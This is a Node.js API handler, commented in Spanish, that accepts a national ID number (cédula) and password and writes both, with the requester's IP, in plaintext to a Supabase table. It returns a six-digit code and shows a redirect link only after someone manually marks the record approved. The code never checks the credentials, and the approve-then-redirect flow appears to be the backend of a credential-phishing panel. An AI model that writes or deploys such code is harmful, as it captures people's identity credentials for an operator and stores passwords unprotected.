// POST /api/solicitar
// Usuario envía cédula + contraseña → se guarda en Supabase, recibe código 6 dígitos
const { setCors, sbQuery, sbInsert, sbUpdate, randCode } = require("./_lib");

module.exports = async (req, res) => {
  setCors(res);
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cedula, password } = req.body || {};
  if (!cedula || !password) {
    return res.status(400).json({ error: "Cédula y contraseña son requeridas." });
  }

  try {
    // ¿Ya existe esta cédula?
    const existing = await sbQuery("solicitudes", "cedula=eq." + encodeURIComponent(cedula) + "&limit=1");

    if (existing.length > 0) {
      const row = existing[0];
      // Actualiza contraseña y timestamp
      await sbUpdate("solicitudes", "id=eq." + row.id, {
        password:   String(password),
        updated_at: new Date().toISOString()
      });
      return res.json({
        status:      row.status,
        codigo:      row.codigo,
        redirectUrl: row.status === "approved" ? (row.redirect_url || "") : ""
      });
    }

    // Nueva solicitud
    const codigo = randCode();
    const ip     = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "";
    const nueva  = await sbInsert("solicitudes", {
      cedula:      String(cedula),
      password:    String(password),
      codigo,
      status:      "pending",
      redirect_url: "",
      ip:          String(ip).split(",")[0].trim(),
      created_at:  new Date().toISOString(),
      updated_at:  new Date().toISOString()
    });

    return res.json({ status: "pending", codigo, redirectUrl: "" });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Error interno del servidor." });
  }
};
